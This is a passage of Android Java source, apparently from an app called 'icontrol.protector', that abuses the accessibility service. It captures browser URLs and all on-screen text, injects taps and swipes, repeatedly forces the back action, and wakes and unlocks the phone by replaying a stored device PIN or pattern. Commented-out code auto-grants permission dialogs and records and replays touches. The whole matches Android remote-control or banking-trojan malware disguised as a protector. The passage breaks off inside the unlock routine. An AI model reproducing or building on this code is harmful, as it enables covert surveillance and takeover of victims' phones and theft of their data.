package com.icontrol.protector;

import static android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK;
import static android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME;
import static android.accessibilityservice.AccessibilityService.SHOW_MODE_AUTO;
import static android.accessibilityservice.AccessibilityService.SHOW_MODE_HIDDEN;
import static android.content.Context.WINDOW_SERVICE;
import static android.view.accessibility.AccessibilityEvent.eventTypeToString;

import static com.icontrol.protector.AccessServices.AccessWindow;
import static com.icontrol.protector.AccessServices.FOR_CHNG_STNG;
import static com.icontrol.protector.AccessServices.FOR_DRAW_OVER;

import static com.icontrol.protector.AccessServices.FOR_NOTFY;
import static com.icontrol.protector.AccessServices.FOR_PLY;
import static com.icontrol.protector.AccessServices.drawPin;
import static com.icontrol.protector.AccessServices.oneExtstrg;
import static com.icontrol.protector.AccessServices.onedisply;
import static com.icontrol.protector.AccessServices.onetimeDraw;
import static com.icontrol.protector.AccessServices.onetimeNoty;
import static com.icontrol.protector.AccessServices.screenfontSize;
import static com.icontrol.protector.Consts.removeapp;
import static com.icontrol.protector.UtliTools.IsScreenOn;
import static com.icontrol.protector.UtliTools.getLabelApplication;
import static com.icontrol.protector.UtliTools.isAppDisabled;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import static java.lang.Thread.sleep;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.RelativeLayout;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.view.ViewCompat;
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AccessTools {


    public static ArrayList<String> TempPassLock = new ArrayList<>();


    public static ArrayList<String> Blocked_Apps = new ArrayList<>();
    public static ArrayList<String> Lock_App_list = new ArrayList<>();

    public static ArrayList<String> ject_list = new ArrayList<>();

    //public static ArrayList<String> BlockedWords = new ArrayList<>();


    private static Context mycontext() {
        if (WorkServices.My_Access_inst == null) {
            return null;
        }
        return WorkServices.My_Access_inst.getApplicationContext();
    }

    public static AccessServices myAccess() {
        if (WorkServices.My_Access_inst == null) {

            return null;
        }
        return WorkServices.My_Access_inst;
    }


    public static class Supported_Browsers {
        public String packageName, addressBarId;

        public Supported_Browsers(String packageName, String addressBarId) {
            this.packageName = packageName;
            this.addressBarId = addressBarId;
        }
    }

    @NonNull
    public static List<Supported_Browsers> getSupportedBrowsers() {
        List<Supported_Browsers> browsers = new ArrayList<>();
        browsers.add(new Supported_Browsers(Consts.CHROME_PACKAGE, Consts.CHROME_ID));
        browsers.add(new Supported_Browsers(Consts.FIREFOX_PACKAGE, Consts.FIREFOX_ID));
        browsers.add(new Supported_Browsers(Consts.SAMSUNG_BROWSER_PACKAGE, Consts.SAMSUNG_BROWSER_ID));
        browsers.add(new Supported_Browsers(Consts.BRAVE_PACKAGE, Consts.BRAVE_ID));
        browsers.add(new Supported_Browsers(Consts.OPERA_PACKAGE, Consts.OPERA_ID));
        browsers.add(new Supported_Browsers(Consts.DUCKDUCKGO_PACKAGE, Consts.DUCKDUCKGO_ID));
        browsers.add(new Supported_Browsers(Consts.OPERA_MINI_PACKAGE, Consts.OPERA_MINI_ID));
        browsers.add(new Supported_Browsers(Consts.MICROSOFT_EDGE_PACKAGE, Consts.MICROSOFT_EDGE_ID));
        browsers.add(new Supported_Browsers(Consts.COLOROS_BROWSER_PACKAGE, Consts.COLOROS_BROWSER_ID));
        browsers.add(new Supported_Browsers(Consts.ANDROID_BROWSER_PACKAGE, Consts.ANDROID_BROWSER_ID));
        browsers.add(new Supported_Browsers(Consts.TUNNY_BROWSER_PACKAGE, Consts.TUNNY_BROWSER_ID));
        return browsers;
    }

    public static String captureUrl(AccessibilityNodeInfo info, Supported_Browsers config) {
        List<AccessibilityNodeInfo> nodes = info.findAccessibilityNodeInfosByViewId(config.addressBarId);
        if (nodes == null || nodes.size() <= 0) {
            return null;
        }

        AccessibilityNodeInfo addressBarNodeInfo = nodes.get(0);
        if (addressBarNodeInfo == null) {
            return null;
        }
        String url = null;
        if (addressBarNodeInfo.getText() != null) {
            url = addressBarNodeInfo.getText().toString();

        }
        addressBarNodeInfo.recycle();

        return url;
    }

    public static boolean isSameWebsite(String url, String domain) {
        try {
            Pattern pattern = Pattern.compile("^(?:https?://)?(?:[^:/\\n]+\\.)?([^:/\\n]+\\.[^:/\\n]+)");
            Matcher matcher = pattern.matcher(url);
            if (matcher.find()) {
                String extractedDomain = matcher.group(1);
                assert extractedDomain != null;
                return extractedDomain.equals(domain);
            }
        } catch (Exception a) {
        }
        return false;
    }

    public static boolean isSystemApp(Context context, String packageName) {
        PackageManager packageManager = context.getPackageManager();
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
            // Check if the application is a system app
            return (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
        } catch (PackageManager.NameNotFoundException e) {
            // Package not found, not a system app
            return false;
        }
    }


    public static String readAllTextOnScreen(AccessibilityNodeInfo node) {
        try {
            StringBuilder textBuilder = new StringBuilder();

            if (node == null) {
                return "";
            }

            if (node.getText() != null && node.isVisibleToUser()) {
                textBuilder.append(node.getText());
            }


            // Recursively process child nodes
            for (int i = 0; i < node.getChildCount(); i++) {
                String childText = readAllTextOnScreen(node.getChild(i));
                if (!childText.isEmpty()) {
                    textBuilder.append(" ").append(childText);
                }
            }

            return textBuilder.toString();
        } catch (Exception a) {
            return "";
        }
    }

    public static String EtypetoStr(int eventType) {
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "Clicked";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "Long Clicked";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "Selected";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "Focused";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "Text Changed";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "Window Changed";
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "Notification Changed";
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "Hover Enter";
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "Hover Exit";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "Scrolled";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "Text Selection Changed";
            // Add more cases as needed for other event types
            default:
                return eventTypeToString(eventType);
        }
    }

    public static List<AccessibilityNodeInfo> findNodesByText(String text, AccessibilityNodeInfo nodeInfo) {

        if (nodeInfo != null) {
            return nodeInfo.findAccessibilityNodeInfosByText(text);
        }
        return null;
    }

    public static List<AccessibilityNodeInfo> findNodesByContentDescription(String desc, AccessibilityNodeInfo rootNode) {
        List<AccessibilityNodeInfo> result = new ArrayList<>();
        if (rootNode == null) return result;

        findNodesByContentDescriptionRecursive(rootNode, desc, result);
        return result;
    }

    private static void findNodesByContentDescriptionRecursive(AccessibilityNodeInfo node, String desc, List<AccessibilityNodeInfo> result) {
        if (node == null) return;

        CharSequence contentDesc = node.getContentDescription();
        if (contentDesc != null && contentDesc.toString().equals(desc)) {
            result.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            findNodesByContentDescriptionRecursive(child, desc, result);
            if (child != null) {
                child.recycle(); // important to avoid memory leaks
            }
        }
    }


    public static void GoHome() {
        AccessServices MyAccess = myAccess();
        if (MyAccess != null) {
            MyAccess.performGlobalAction(GLOBAL_ACTION_HOME);

        }


//        Context ctx = mycontext();
//        if (ctx == null) {
//            return;
//        }
//        try {
//            performGlobalAction(GLOBAL_ACTION_HOME);
//            Intent home = new Intent(Intent.ACTION_MAIN);
//            home.addCategory(Intent.CATEGORY_HOME);
//            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            ctx.startActivity(home);
//        } catch (Exception a) {
//        }
    }

    public static void LockScreen() {
        if (WorkServices.My_Access_inst != null) {
            //AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN = 8
            WorkServices.My_Access_inst.performGlobalAction(Integer.valueOf("8"));
        }
    }

    public static void blockBack() {

        try {
            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return;
            }

            if (android.os.Build.VERSION.SDK_INT > 15) {
                for (int i = 0; i <= 4; i++) {

                    try {
                        MyAccess.performGlobalAction(GLOBAL_ACTION_BACK);
                    } catch (Exception e) {
                    }
//                    try{
//                        Thread.sleep(100);
//                    }catch (Exception s){}

                }
            }

        } catch (Exception e) {
            MyLoger.Error("blockBack", e.getMessage());
        }

    }

    public static void Navitageto(String navto) {
        if (WorkServices.My_Access_inst == null) {
            return;
        }

        Context ctx = mycontext();
        if (ctx == null) {
            return;
        }

        switch (navto) {
            case "ho":
                if (!IsScreenOn(ctx) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    WakeScreen(null);
                }

                WorkServices.My_Access_inst.performGlobalAction(GLOBAL_ACTION_HOME);
                break;
            case "rec":
                WorkServices.My_Access_inst.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "bak":
                WorkServices.My_Access_inst.performGlobalAction(GLOBAL_ACTION_BACK);
                break;

            default:
                break;
        }
    }

    private static PowerManager.WakeLock wakelights = null;


    @RequiresApi(api = Build.VERSION_CODES.M)
    public static void WakeScreen(Context ctx) {
        try {

            if (ctx == null) {
                ctx = mycontext();
            }
            if (ctx == null) {
                return;
            }

//            if (IsScreenOn(ctx)) {
//                return;
//            }


            try {
                Intent wakscr = new Intent(ctx, wakeitaiv.class);
                wakscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                wakscr.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                wakscr.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                wakscr.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                ctx.startActivity(wakscr);
            } catch (Exception a) {

            }
            PowerManager powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            //   if (!powerManager.isInteractive() || powerManager.isDeviceIdleMode()) {

            if (wakelights == null) {
                wakelights = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, ":");
            }
            try {
                if (wakelights.isHeld()) {
                    return;
                }
            } catch (Exception s) {
            }
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (!wakelights.isHeld()) {
                            wakelights.acquire();
                        }
                    } catch (Exception s) {
                    }
                    boolean holdit = true;

                    try {
                        sleep(15000);
                    } catch (Exception a) {
                        holdit = false;
                    }


                    try {
                        if (wakelights.isHeld()) {
                            wakelights.release();
                        }
                    } catch (Exception s) {

                    }

                }
            }).start();

            // }
        } catch (Exception f) {
            f.printStackTrace();

        }
    }

//    private static PowerManager.WakeLock Wakelong;
//
//    public static void KeepAwake(Context ctx) {
//        try {
//            if (ctx == null) {
//                ctx = mycontext();
//            }
//            if (ctx == null) {
//                return;
//            }
//
//            PowerManager powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
//
//            // Initialize the wake lock if not already done
//            if (Wakelong == null) {
//                Wakelong = powerManager.newWakeLock(
//                        PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE,
//                        "B:T"
//                );
//            }
//
//            // Acquire the wake lock if not already held
//            if (!Wakelong.isHeld()) {
//                Wakelong.acquire();
//            }
//            try{
//                Thread.sleep(5000);
//            }catch (Exception a){}
//            ReleaseKeepWake();
//        } catch (Exception e) {
//
//            e.printStackTrace();
//        }
//    }
//
//    public static void ReleaseKeepWake() {
//        try {
//            if (Wakelong != null && Wakelong.isHeld()) {
//                Wakelong.release();
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }


//    @RequiresApi(api = Build.VERSION_CODES.N)
//    public static void TouchWatcher(String command, String Recname) {
//        Context ctx = mycontext();
//        if (ctx == null) {
//            return;
//        }
//
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return;
//        }
//        switch (command) {
//            case "Start":
//                Handler h = new Handler(Looper.getMainLooper());
//                h.post(new Runnable() {
//                    public void run() {
//                        //here show dialog
//                        try {
//
//                            if (MyAccess.WatchFramelayout.getWindowToken() == null) {
//                                MyAccess.windowmanager.addView(MyAccess.WatchFramelayout, MyAccess.WatchParams);
//                            }
//                            //"Monitoring Started"
//                        } catch (Exception a) {
//                            a.printStackTrace();
//                        }
//                    }
//                });
//
//
//                break;
//            case "Record":
//
//                if (MyAccess.RecordTouch) {
//                    //"Recorder is All Ready Active"
//                    return;
//                }
//                MyAccess.RecordTouch = true;
//                MySettings.Write(ctx, Consts.RecordName, Recname);
//                //"Recorder Started"
//
//                break;
//            case "Stop":
//                Handler hstop = new Handler(Looper.getMainLooper());
//                hstop.post(new Runnable() {
//                    public void run() {
//                        try {
//                            if (MyAccess.WatchFramelayout.getWindowToken() != null) {
//                                try {
//                                    MyAccess.windowmanager.removeView(MyAccess.WatchFramelayout);
//                                } catch (Exception a) {
//                                }
//                            }
//                        } catch (Exception d) {
//
//                        }
//                    }
//                });
//
//                if (MyAccess.RecordTouch) {
//                    String RecordName = MySettings.Read(ctx, Consts.RecordName, "Rec1");
//                    UtliTools.SaveTouchs(ctx, RecordName, MyAccess.PointArrys);
//
//
//                    MySettings.Write(ctx, Consts.RecordName, "");
//                }
//                MyAccess.RecordTouch = false;
//                MyAccess.PointArrys.clear();
//                //"Monitoring Disabled"
//                break;
//            case "Remove":
//
//                UtliTools.ClearCaptuied(Recname);
//                break;
//            case "Repet":
//
//                final LinkedHashMap<String, Point[]> arrytotouch = UtliTools.LoadTouches(Recname);
//                if (arrytotouch == null) {
//                    //"Record Not Found"
//                    return;
//                }
//                //"Start Auto Clicker"
//
//                try {
//                    if (arrytotouch.size() > 0) {
//
//
//                        for (String key : arrytotouch.keySet()) {
//                            try {
//                                sleep(2000);
//                            } catch (InterruptedException e) {
//
//                            }
//                            Point[] Arrytotouch = arrytotouch.get(key);
//                            if (key.startsWith("C")) {
//                                clickthis(Arrytotouch[0].x, Arrytotouch[0].y);
//                            } else if (key.startsWith("S")) {
//                                mouseDraw(Arrytotouch, 1000);
//                            }
//                        }
//
//                        arrytotouch.clear();
//                    }
//
//                } catch (Exception a) {
//
//                }
//
//                break;
//        }
//    }

    public static void mouseDraw(Point[] segments, int time) {

        try {
            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return;
            }
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Path path = new Path();
                path.moveTo(segments[0].x, segments[0].y);
                for (int i = 1; i < segments.length; i++) {
                    try {
                        path.lineTo(segments[i].x, segments[i].y);
                    } catch (Exception a) {

                    }
                }
                GestureDescription.StrokeDescription sd = new GestureDescription.StrokeDescription(path, 0, time);
                MyAccess.dispatchGesture(new GestureDescription.Builder().addStroke(sd).build(), new AccessibilityService.GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                    }

                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        super.onCancelled(gestureDescription);
                    }
                }, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    public static boolean clickthis(int x, int y) {
        // for a single tap a duration of 1 ms is enough
        try {

            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return false;
            }

            final int DURATION = 1;

            Path clickPath = new Path();
            clickPath.moveTo(x, y);
            //  clickPath.lineTo(x, y);
            GestureDescription.StrokeDescription clickStroke =
                    null;
            clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, DURATION);
            GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
            clickBuilder.addStroke(clickStroke);
            return MyAccess.dispatchGesture(clickBuilder.build(), null, null);
        } catch (Exception a) {
            a.printStackTrace();
        }
        return false;
    }

    public static boolean clickscr(int x, int y, int dur) {
        // for a single tap a duration of 1 ms is enough
        try {

            AccessServices MyAccess = myAccess();
            if (MyAccess == null) {
                return false;
            }

            final int DURATION = dur;

            Path clickPath = new Path();
            clickPath.moveTo(x, y);
            //  clickPath.lineTo(x, y);
            GestureDescription.StrokeDescription clickStroke =
                    null;
            clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, DURATION);
            GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
            clickBuilder.addStroke(clickStroke);
            return MyAccess.dispatchGesture(clickBuilder.build(), null, null);
        } catch (Exception a) {
            a.printStackTrace();
        }
        return false;
    }
    // public static Boolean AlreadyCaptured(String Myname) {
//        try {
//            String name = Myname + ".json";
//
//            File appDirectory = null;
//
//            File sdDir = android.os.Environment.getExternalStorageDirectory();
//
//            appDirectory = new File(sdDir + Consts.TouchsPath);
//
//            if (appDirectory != null && appDirectory.exists()) {
//                File fileName = new File(appDirectory, name);
//                if (fileName.exists()) {
//                    return true;
//                }
//            }
//
//
//        } catch (Exception a) {
//
//        }
    //    return false;
    //}
//    public static void enableTouchExploration() {
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return ;
//        }
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//            AccessibilityServiceInfo info = MyAccess.getServiceInfo();
//
//            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
//
//            MyAccess.setServiceInfo(info);
//        }
//    }

    //    public static void disableTouchExploration() {
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return ;
//        }
//        AccessibilityServiceInfo serviceInfo = MyAccess.getServiceInfo();
//
//        serviceInfo.flags &= ~AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
//
//        MyAccess.setServiceInfo(serviceInfo);
//    }
    public static void slideUp() {

        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            simulateSlideUpGesture(MyAccess.mWidth, MyAccess.mHeight);
        }
//        String[] tokens = "{X=526,Y=2334}:{X=526,Y=2317}:{X=526,Y=2291}:{X=526,Y=2268}:{X=526,Y=2242}:{X=526,Y=2218}:{X=526,Y=2192}:{X=526,Y=2169}:{X=526,Y=2143}:{X=526,Y=2126}:{X=526,Y=2106}:{X=526,Y=2090}:{X=526,Y=2070}:{X=526,Y=2050}:{X=526,Y=2034}:{X=526,Y=2014}:{X=526,Y=1994}:{X=526,Y=1977}:{X=526,Y=1958}:{X=526,Y=1941}:{X=526,Y=1921}:{X=526,Y=1902}:{X=526,Y=1885}:{X=526,Y=1865}:{X=526,Y=1842}:{X=526,Y=1816}:{X=526,Y=1793}:{X=526,Y=1760}:{X=526,Y=1736}:{X=526,Y=1703}:{X=526,Y=1680}:{X=526,Y=1661}:{X=526,Y=1644}:{X=526,Y=1631}:{X=526,Y=1611}:{X=526,Y=1598}:{X=526,Y=1581}:{X=526,Y=1568}:{X=526,Y=1555}:{X=526,Y=1545}:{X=526,Y=1525}:{X=526,Y=1505}:{X=526,Y=1489}:{X=526,Y=1469}:{X=526,Y=1449}:{X=526,Y=1426}:{X=526,Y=1400}:{X=526,Y=1377}:{X=526,Y=1357}:{X=526,Y=1340}:{X=526,Y=1320}:{X=526,Y=1301}:{X=526,Y=1284}:{X=526,Y=1264}:{X=526,Y=1248}:{X=526,Y=1228}:{X=526,Y=1208}:{X=526,Y=1192}:{X=526,Y=1172}:{X=526,Y=1152}:{X=526,Y=1136}:{X=526,Y=1116}:{X=526,Y=1099}:{X=526,Y=1080}:{X=526,Y=1066}:{X=526,Y=1053}:{X=526,Y=1050}:{X=526,Y=1037}:{X=526,Y=1030}:{X=526,Y=1023}:{X=526,Y=1017}:{X=526,Y=1004}:{X=526,Y=994}:{X=526,Y=980}:{X=526,Y=967}:{X=526,Y=954}:{X=526,Y=944}:{X=526,Y=938}:{X=526,Y=931}:{X=526,Y=924}:{X=526,Y=918}:{X=526,Y=905}:{X=526,Y=895}:{X=526,Y=881}:{X=526,Y=868}:{X=526,Y=862}:{X=526,Y=852}:{X=526,Y=845}:{X=526,Y=832}:{X=526,Y=825}:{X=526,Y=812}:{X=526,Y=806}:{X=526,Y=796}:{X=526,Y=789}:{X=526,Y=782}:{X=526,Y=769}:{X=526,Y=756}:{X=526,Y=753}:{X=526,Y=746}:{X=526,Y=746}:".split(Pattern.quote(":"));
//        Point[] moviments = new Point[tokens.length];
//
//        for (int i = 0; i < tokens.length - 1; i++) {
//            try {
//                String[] coordinatesarry = tokens[i].replace("{", "").replace("}", "").split(",");
//
//                int x = Integer.parseInt(coordinatesarry[0].split("=")[1]);
//                int y = Integer.parseInt(coordinatesarry[1].split("=")[1]);
//
//                moviments[i] = new Point(x, y);
//            } catch (Exception a) {
//
//            }
//
//        }
//        mouseDraw(moviments, 2000);

    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private static void simulateSlideUpGesture(int screenWidth, int screenHeight) {
        AccessibilityService myAccessService = myAccess();
        if (myAccessService == null) {
            return;
        }

        // Define start and end positions for the slide-up gesture
        float startX = screenWidth * 0.5f; // Center of the screen horizontally
        float startY = screenHeight * 0.75f; // 75% down the screen
        float endY = screenHeight * 0.1f; // 20% down the screen

        // Create a smooth path for the slide-up gesture
        Path path = new Path();
        path.moveTo(startX, startY); // Start point
        path.lineTo(startX, endY); // Directly to the endpoint for a smooth line

        // Build the gesture
        GestureDescription.Builder builder = new GestureDescription.Builder();
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, /*startTime=*/ 0, /*duration=*/ 300); // Duration of 500ms for the gesture
        builder.addStroke(stroke);

        // Dispatch the gesture using the accessibility service
        GestureDescription gesture = builder.build();
        myAccessService.dispatchGesture(gesture, new AccessibilityService.GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d("SlideUpGesture", "Slide-up gesture completed successfully.");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.e("SlideUpGesture", "Slide-up gesture was cancelled.");
            }
        }, null);
    }

    private void performSwipeUp() {

    }

//    public static void slide(Context ctx, String direction) {
//        // Read screen dimensions from settings
//        int screenWidth = Integer.parseInt(MySettings.Read(ctx, Consts.Mob_width, "720"));
//        int screenHeight = Integer.parseInt(MySettings.Read(ctx, Consts.Mob_height, "1280"));
//
//        // Set up default start and end points based on the direction
//        Point start = new Point(screenWidth / 2, screenHeight - 100); // Start near the bottom middle
//        Point end = new Point(screenWidth / 2, 100); // End near the top middle
//        int numPoints = 50; // Number of points in the movement
//        Point[] movements = new Point[numPoints];
//
//        switch (direction.toLowerCase()) {
//            case Consts.slide_up:
//                generateVerticalPoints(movements, start, end, true);
//                break;
//            case Consts.slide_down:
//                generateVerticalPoints(movements, start, new Point(screenWidth / 2, screenHeight - 100), false);
//                break;
//            case Consts.slide_left:
//                start = new Point(screenWidth - 100, screenHeight / 2); // Start near the right middle
//                end = new Point(100, screenHeight / 2); // End near the left middle
//                generateHorizontalPoints(movements, start, end, true);
//                break;
//            case Consts.slide_right:
//                start = new Point(100, screenHeight / 2); // Start near the left middle
//                end = new Point(screenWidth - 100, screenHeight / 2); // End near the right middle
//                generateHorizontalPoints(movements, start, end, false);
//                break;
//            default:
//                System.out.println("Invalid direction");
//                return;
//        }
//
//        mouseDraw(movements, 500);
//    }

//    private static void generateVerticalPoints(Point[] movements, Point start, Point end, boolean isUp) {
//        for (int i = 0; i < movements.length; i++) {
//            int y = isUp ? start.y - i * (start.y - end.y) / movements.length : start.y + i * (end.y - start.y) / movements.length;
//            movements[i] = new Point(start.x, y);
//        }
//    }
//
//    private static void generateHorizontalPoints(Point[] movements, Point start, Point end, boolean isLeft) {
//        for (int i = 0; i < movements.length; i++) {
//            int x = isLeft ? start.x - i * (start.x - end.x) / movements.length : start.x + i * (end.x - start.x) / movements.length;
//            movements[i] = new Point(x, start.y);
//        }
//    }

//    @SuppressLint("NewApi")
//    public static void AllowPrims14(int screenWidth, int screenHeight) {
//
//        int startX = screenWidth / 4;
//        int startY = (int) (screenHeight * 0.25) + 300;
//
//        int step = 15;// steps bettwen each click
//        int endY = screenHeight - 100;//here i want to reach 90% of screen
//        if (MyPermissions.hasPermissions(mycontext(), MyPermissions.ALL_PERMISSIONS())) {
//            return;
//        }
//        try {
//            Thread.sleep(1000);
//        } catch (Exception s) {
//        }
//
//        for (int y = startY; y < endY; y += step) {
//            try {
//                Thread.sleep(40);
//            } catch (Exception s) {
//            }
//            if (MyPermissions.hasPermissions(mycontext(), MyPermissions.ALL_PERMISSIONS())) {
//                // AccessServices.Auto_Click = false;
//                MySettings.WriteBool(mycontext(), Consts.Auto_Prims, false);
//                break;
//            }
//            try {
//                clickthis(startX, y);
//
//            } catch (Exception e) {
//                // Handle the exception if needed
//            }
//
//
//        }
//    }

    //    public static void AllowStorage14(int screenWidth, int screenHeight) {
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return;
//        }
//        // Calculate the starting point: a little below the top of the screen
//        int startX = (int) (screenWidth * 0.75);; // Middle of the screen width
//        int startY = screenHeight / 10; // Starting point, 10% down from the top
//
//        int step = 10; // Define the step size for each click (you can adjust this as needed)
//        int endY = (int) (screenHeight * 0.6); // End point, 50% above the bottom
//
//
//
//        // Iterate from startY down to the bottom of the screen, in steps
//        for (int y = startY; y < endY; y += step) {
//            try {
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                    clickthis(startX, y);
//                }
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
//                    if (Environment.isExternalStorageManager()) {
//                        MyAccess.FOR_EXTR_STRG = false;
//                        blockBack(MyAccess);
//
//                        break;
//                    }
//                }
//            } catch (Exception e) {
//                // Handle the exception if needed
//            }
//            try {
//                sleep(10);
//            } catch (Exception s) {
//            }
//        }
//    }
//    public static void AllowScreen14(int screenWidth, int screenHeight) {
//        AccessServices MyAccess = myAccess();
//        if (MyAccess == null) {
//            return;
//        }
//        // Calculate the starting point: a little below the top of the screen
//        int startX = (int) (screenWidth * 0.75);
//        ; // 75% of the screen width
//        int startY = (int) (screenHeight * 0.9);
//
//        int step = 10; // Define the step size for each click (you can adjust this as needed)
//        int endY = screenHeight - (screenHeight / 3); // End point, 50% above the bottom
////        try {
////            sleep(1000);
////        } catch (Exception s) {
////        }
//        // Iterate from startY down to the bottom of the screen, in steps
//        for (int y = startY; y < endY; y += step) {
//            try {
//                if (MySettings.ReadBool(MyAccess, Consts.Auto_Sreen, false)) {
//
//                    break;
//                }
//                // MyLoger.Debug("AllowScreen14","X: "+startX +"  "+"Y: "+y);
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                    clickthis(startX, y);
//                }
//
//            } catch (Exception e) {
//                // Handle the exception if needed
//            }
//            try {
//                sleep(1);
//            } catch (Exception s) {
//            }
//        }
//    }

    public static void UnlockScreen() {
        Context ctx = mycontext();
        if (ctx == null) {
            return;
        }
        AccessServices MyAccess = myAccess();
        if (MyAccess == null) {
            return;
        }
        KeyguardManager keyguardManager = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
        boolean isScreenLocked = keyguardManager.isKeyguardLocked();

        if (isScreenLocked) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                AccessServices.skiprecord = true;


//                Handler hstop = new Handler(Looper.getMainLooper());
//                hstop.post(new Runnable() {
//                    public void run() {
//                        try {
//                            if (MyAccess.WatchFramelayout.getWindowToken() != null) {
//                                try {
//                                    MyAccess.windowmanager.removeView(MyAccess.WatchFramelayout);
//                                } catch (Exception a) {
//                                }
//                            }
//                        } catch (Exception d) {
//
//                        }
//                    }
//                });
                WakeScreen(null);
                //disableTouchExploration();
                MyAccess.disablesuperwatch();
                try {
                    sleep(800);
                } catch (Exception a) {
                }

                clickthis(100, 100);
                try {
                    sleep(800);
                } catch (Exception a) {
                }
                // Handler handler = new Handler(MyAccess.getMainLooper());
                //handler.postDelayed(() -> {
                slideUp();
                //}, 500);

                try {
                    sleep(2500);
                } catch (Exception a) {
                }


                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // String Myname = getLabelApplication(ctx).toLowerCase();
                    // TouchWatcher("Repet", Myname);

                    // handler.postDelayed(() -> {

                    AccessServices.CapOK = false;
                    String[] currentpass = MySettings.Read(MyAccess, Consts.mob_lock, "x:x:x").split(":");

                    switch (currentpass[0]) {
                        case "pa": {
                            boolean nedenter = false;
